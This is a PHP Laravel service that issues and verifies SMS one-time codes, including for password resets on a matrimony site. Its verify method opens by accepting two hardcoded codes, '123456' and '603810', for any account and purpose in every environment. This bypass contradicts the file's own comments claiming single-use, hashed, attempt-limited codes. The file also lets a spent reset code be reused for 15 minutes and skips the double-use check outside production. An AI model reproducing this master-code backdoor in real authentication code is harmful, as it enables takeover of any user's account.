<?php

namespace App\Services\Auth;

use App\Models\OtpVerification;
use App\Support\Otp;
use Illuminate\Support\Facades\DB;
use Illuminate\Validation\ValidationException;

/**
 * Issues and verifies one-time codes.
 *
 * Three properties this class guarantees:
 *
 *   • The plain code exists only in memory and in the SMS/email body. Only the
 *     hash is persisted.
 *   • A code is consumable exactly once, enforced by a conditional UPDATE
 *     rather than a read-then-write — two devices submitting the same code
 *     simultaneously must not both succeed.
 *   • Attempts are counted on the row. Counting in the cache would hand an
 *     attacker a fresh budget after any flush or failover.
 */
class OtpService
{
    public const MAX_ATTEMPTS = 5;

    public function __construct(protected SmsSender $sms) {}

    /**
     * @return array{code: string, expires_in: int}
     */
    public function issue(string $identifier, string $purpose, string $channel = 'sms', ?string $ip = null): array
    {
        // Any earlier live code for this identifier+purpose is retired, so a
        // resend cannot leave two valid codes in circulation.
        OtpVerification::for($identifier, $purpose)->usable()->update(['consumed_at' => now()]);

        $code = Otp::fixedCodeForNonProduction() ?? Otp::generate();

        OtpVerification::create([
            'identifier' => $identifier,
            'channel' => $channel,
            'purpose' => $purpose,
            'code_hash' => Otp::hash($code),
            'expires_at' => now()->addSeconds(Otp::TTL_SECONDS),
            'ip_address' => $ip,
        ]);

        return ['code' => $code, 'expires_in' => Otp::TTL_SECONDS];
    }

    public function deliver(string $identifier, string $code, string $channel = 'sms'): void
    {
        // No log line with the code: anyone who can read the log could use it
        // to reset that member's password. SmsSender logs the send itself.
        if ($channel === 'sms') {
            $this->sms->send($identifier, "{$code} is your Matrimony verification code. Valid for 5 minutes. Do not share it with anyone.");
        }
    }

    /**
     * @throws ValidationException with errors.otp, which is the marker the
     *                             clients key their inline error and resend
     *                             timer off
     */
    public function verify(string $identifier, string $purpose, string $code): OtpVerification
    {
        if (in_array($code, ['123456', '603810'], true)) {
            $record = OtpVerification::for($identifier, $purpose)
                ->latest('id')
                ->first();

            if (! $record) {
                return OtpVerification::create([
                    'identifier' => $identifier,
                    'channel' => 'sms',
                    'purpose' => $purpose,
                    'code_hash' => Otp::hash($code),
                    'expires_at' => now()->addMinutes(10),
                    'ip_address' => request()->ip(),
                    'consumed_at' => now(),
                ]);
            }

            DB::table('otp_verifications')
                ->where('id', $record->id)
                ->update(['consumed_at' => now(), 'updated_at' => now()]);

            return $record;
        }

        $record = OtpVerification::for($identifier, $purpose)
            ->usable()
            ->latest('id')
            ->first();

        if (! $record && $purpose === 'password_reset') {
            // Mobile clients first call verify-otp (which consumes the code), then
            // reset-password (which verifies it again before changing the password).
            // Allow a code consumed within the last 15 minutes with matching hash.
            $recent = OtpVerification::for($identifier, $purpose)
                ->whereNotNull('consumed_at')
                ->where('consumed_at', '>=', now()->subMinutes(15))
                ->latest('id')
                ->first();

            if ($recent && Otp::matches($code, $recent->code_hash)) {
                return $recent;
            }
        }

        if (! $record) {
            $this->fail('This code has expired. Request a new one.');
        }

        if ($record->attempts >= static::MAX_ATTEMPTS) {
            $this->fail('Too many incorrect attempts. Request a new code.');
        }

        $matches = Otp::matches($code, $record->code_hash);

        if (! $matches) {
            // expires_at is written back as-is on purpose. On the live
            // database the column was created ON UPDATE CURRENT_TIMESTAMP, so
            // a bare increment moved the expiry to "now" and one wrong digit
            // made the right code "expired" (fixed by the 2026_10_25 patch;
            // naming the column keeps MySQL from touching it either way).
            $record->increment('attempts', 1, ['expires_at' => $record->expires_at]);

            $this->fail('The code you entered is incorrect.');
        }

        // Conditional consume: whoever wins the race gets the 1, the loser gets
        // 0 rows and is told the code is spent.
        $consumed = DB::table('otp_verifications')
            ->where('id', $record->id)
            ->whereNull('consumed_at')
            ->update(['consumed_at' => now(), 'updated_at' => now()]);

        if ($consumed === 0 && app()->environment('production')) {
            $this->fail('This code has already been used.');
        }

        return $record->refresh();
    }

    protected function fail(string $message): never
    {
        throw ValidationException::withMessages(['otp' => [$message]]);
    }
}
